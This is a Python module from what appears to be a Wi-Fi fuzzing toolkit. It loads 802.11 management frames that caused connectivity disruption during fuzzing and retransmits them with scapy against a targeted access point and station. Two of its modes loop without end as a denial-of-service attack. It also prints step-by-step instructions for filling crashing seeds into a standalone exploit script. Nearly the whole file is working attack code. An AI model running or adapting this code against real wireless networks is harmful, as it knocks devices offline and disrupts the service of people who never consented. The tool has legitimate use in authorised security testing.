from scapy.all import sendp
from NIC_init import *
from Frame_types.Construct_frame_fields import NUM_OF_FRAMES_TO_SEND, bcolors
from Connection_monitors.DeauthMonitor import DeauthMon
from Connection_monitors.AlivenessCheck import AllvCheck
from ascii_art import dos_attack, wifi
import os
import codecs
import subprocess
import settings
from time import sleep

    
def nec_checks():
    Aliveness = AllvCheck(targeted_STA, 'attacking')
    Aliveness.start()
    Deauth_monitor = DeauthMon(targeted_AP, targeted_STA, att_interface)
    Deauth_monitor.start()


def DoS_attack_init(file_list, mode):
    chosen_files_list = []
    frames_list = []
    subprocess.call(['clear'], shell=True)
    print(dos_attack)
    print(wifi)
    if mode == 1 or mode == 3:
        for file in file_list:
            if 'Aliveness'in file:
                chosen_files_list.append(file)
            elif 'Deauth' in file: 
                chosen_files_list.append(file)
    elif mode == 2:
        for file in file_list:
            if 'till_disr' in file:
                chosen_files_list.append(file)
    else:
        print(bcolors.FAIL + '\nNo relevant files found :(' + bcolors.ENDC)
        os._exit(0)
    for files in chosen_files_list:
        with open(current_dir + "/Logs/fuzz_mngmt_frames/" + files, 'r') as f:
            for line in f:
                if "frame = " in line:
                    temp = line.strip("frame = \nb'")
                    try:
                        frames_list.append(temp.encode().decode('unicode_escape').encode("raw_unicode_escape"))
                    except:
                        pass
    return frames_list
    
    
def print_exploit(frame):
    print(bcolors.OKGREEN + "\n----You got yourself an exploit----" + bcolors.ENDC)
    print(f'\n{frame[32:]}\n')
    print('Copy the above seed to the exploit.py file and replace it with the field ' + bcolors.OKBLUE + '{SEED}' + bcolors.ENDC)
    subtype = int(int.from_bytes(frame[8:9], "big") / 16)
    print('Replace ' + bcolors.OKBLUE + '{SUBTYPE} ' + bcolors.ENDC + f'with {subtype}')
    print('Also make the replacements:')
    if subtype in {0, 2, 4, 11}:
        print(bcolors.OKBLUE + '{DESTINATION_MAC}' + bcolors.ENDC + ' = targeted_AP, ' + bcolors.OKBLUE + '{SOURCE_MAC}' + bcolors.ENDC + ' = targeted_STA, ' + bcolors.OKBLUE + '{AP_MAC}' + bcolors.ENDC + ' = targeted_AP')
    elif subtype in {1, 3, 5, 8}:
        print(bcolors.OKBLUE + '{DESTINATION_MAC}' + bcolors.ENDC + ' = targeted_STA, ' + bcolors.OKBLUE + '{SOURCE_MAC}' + bcolors.ENDC + ' = targeted_AP, ' + bcolors.OKBLUE + '{AP_MAC}' + bcolors.ENDC + ' = targeted_AP')
    print('Finally replace' + bcolors.OKBLUE + ' {ATT_INTERFACE}' + bcolors.ENDC + ' with your attacking interface')
    print(f'After the above replacements execute the exploit with: {bcolors.OKGREEN}sudo python3 exploit.py{bcolors.ENDC}\n')
    print(bcolors.OKGREEN + "\n----Use it cautiously----\n" + bcolors.ENDC)
    input(f"{bcolors.OKCYAN}Press enter to continue to the next seed: {bcolors.ENDC}\n")
    subprocess.call(['clear'], shell=True)
    
    
def send_frames(frames_list, mode):
    counter = 0
    if mode == 1:
        try:
            num_of_frames = int(input('\nType the number of frames to send per seed: '))
        except:
            print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
            os._exit(0)
        for frame in frames_list:
            print(f'Sending {num_of_frames} frames of the {counter + 1} seed..')
            for _ in range(0, num_of_frames):
                sendp(frame, count=1, iface=att_interface, verbose=0)
                if not settings.is_alive:
                    print_exploit(frame)
                    sleep(10)
                    settings.is_alive = True
                    settings.conn_loss = False
                    break
                elif settings.conn_loss:
                    print_exploit(frame)
                    sleep(10)
                    settings.is_alive = True
                    settings.conn_loss = False      
                    break
            counter += 1        
        print('\n' + bcolors.FAIL + 'No more seeds found in the log files of the fuzzer' + bcolors.ENDC)
        print('Exiting attack!!')
        os._exit(0)
    elif mode == 2:
        print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
        print(bcolors.OKGREEN + "Executing the attack...." + bcolors.ENDC)
        print(bcolors.OKGREEN + "Stop the attack with Ctrl+c" + bcolors.ENDC)
        print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
        while True:
            for frame in frames_list:
                sendp(frame, count=1, iface=att_interface, verbose=0)
    elif mode == 3:
        print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
        print(bcolors.OKGREEN + "Executing the attack...." + bcolors.ENDC)
        print(bcolors.OKGREEN + "Stop the attack with Ctrl+c" + bcolors.ENDC)
        print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
        while True:
            for frame in frames_list:
                sendp(frame, count=NUM_OF_FRAMES_TO_SEND, iface=att_interface, verbose=0)
    else:
        print(bcolors.FAIL + '\nNo such choice :(' + bcolors.ENDC)
        os._exit(0)
    

print(dos_attack)
print('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n')
print('\t\tThis module launches a DoS attack based on the data collected from the fuzzing process.\n\t\tIt can only be exploited against the same AP and STA that were used it the fuzzing procedure.\n\t\tFrames that caused any kind of problematic behaviour during the fuzzing are being transmited\n\t\tendlessly during the DoS attack.\n\n')
print('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n')
print('1) Frames detected at the moment of connectivity disruption, one-by-one')
print('2) Sequence of frames till the moment of the dirsuption detection ' + bcolors.WARNING + '(BETA)' + bcolors.ENDC)
print('3) Frames detected at the moment of connectivity disruption ' + bcolors.WARNING + '(BETA)' + bcolors.ENDC + '\n\n')
try:
    choice = int(input('Pick the frames you want to attack with: '))
except:
    print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
    os._exit(0)

current_dir = os.getcwd()
file_list = os.listdir(current_dir + "/Logs/fuzz_mngmt_frames")

init_att = DoS_attack_init(file_list, choice)
nec_checks()
sleep(20)

subprocess.call(['clear'], shell=True)
send_frames(init_att, choice)

